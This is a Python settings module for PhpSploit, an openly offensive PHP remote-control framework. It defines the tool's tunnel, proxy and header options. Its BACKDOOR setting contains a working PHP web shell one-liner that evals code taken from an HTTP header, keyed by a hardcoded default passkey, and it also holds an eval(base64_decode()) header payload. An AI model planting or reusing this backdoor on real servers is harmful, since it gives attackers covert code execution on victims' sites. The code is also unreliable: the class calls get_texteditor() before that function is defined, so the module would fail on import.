"""PhpSploit configuration settings.

Configuration settings data descriptor, instanciated from session's
package as "Conf".

Basic Behavior:
  * Considering their internal uses by the core, they are defined and
    set to their default values at initialization. It also means that
    unlike environment variables (see environment.py), new settings
    cannot be created, and existing ones cannot be removed.
  * However, a few settings can be (and defaultly are) disabled by
    setting their value to None.

HTTP_* Settings special behavior:
  * Unlike standard settings, values whose name starts with 'HTTP_' are
    dynamically used by the PhpSploit network tunnel as HTTP Headers.
    They can be removed by setting their value to None, and new ones
    can be created. They take a String as argument, or a multiline
    string, in which case a random line from it will be picked on each
    HTTP tunnel request.

"""

from datatypes import *
import tempfile, webbrowser

class Init:
    """Phpsploit Settings data descriptor & initializer.
    This data descriptor obey the conventions defined in the
    module's docstring.

    * Since the most part of the settings use a phpsploit dedicated
      data type (datatypes module), their additionnal features are
      supported, with backward compatibility with python built-in types.
    * This data descriptor ignores case, and implitly considers any
      attribute (var name) call as uppercase.
    * All settings are binded as attributes, handled by the data
      descriptor.

    Restrictions:
      - Only "[A-Za-z0-9_]" chars are accepted for names
      - Creation and deletion are prohibited (except for HTTP_*).
      * Failure to comply them whill raise a ValueError exception.

    WARNING: Acessing a value whose type is a phpsploit special
    datatype returns the type's call() method instead of it's basic
    value. It means that "session.Conf.REQ_INTERVAL" return value
    will be the same as the one returned by REQ_INTERVAL.call(), so
    it handles types like Interval or RandLine that can return
    different values.
    To bypass the behavior mentionned above, the descriptor's __call__
    method can be used, setting the variable name as argument.

    Example:
    >>> session.Conf.REQ_INTERVAL # return a dynamic random interval
    3.2
    >>> session.Conf('REQ_INTERVAL') # return the wanted object
    (1.0, 5.0)

    """
    TMPPATH  = WritableDir( tempfile.gettempdir() )
    SAVEPATH = WritableDir( tempfile.gettempdir() )

    TARGET   = Url(None)
    BACKDOOR = PhpCode("@eval($_SERVER['HTTP_%%PASSKEY%%']);")
    PROXY    = Proxy(None)
    PASSKEY  = str("phpSpl01t")

    TEXTEDITOR = get_texteditor()
    WEBBROWSER = Executable( webbrowser.get().name )

    HTTP_USER_AGENT     = RandLine("file://framework/misc/http_user_agents.lst")
    REQ_DEFAULT_METHOD  = str('GET')
    REQ_HEADER_PAYLOAD  = PhpCode("eval(base64_decode(%%BASE64%%))")
    REQ_INTERVAL        = Interval("1 < 10")
    REQ_MAX_HEADERS     = int(100)
    REQ_MAX_HEADER_SIZE = ByteSize("4 KiB")
    REQ_MAX_POST_SIZE   = ByteSize("4 MiB")
    REQ_ZLIB_TRY_LIMIT  = ByteSize("20 MiB")


    def __init__(self):
        pass



def get_texteditor():
    """Try to determine the system's text editor"""
    from os import environ
    from sys import platform

    # cross-platform editor handling
    if 'EDITOR' in environ:
        editor = environ['EDITOR']
    elif platform.startswith('win'):
        editor = "notepad.exe"
    else:
        editor = "vi"

    # check if it is a real executable
    try:
        return Executable(editor)
    except ValueError:
        return Executable(None)
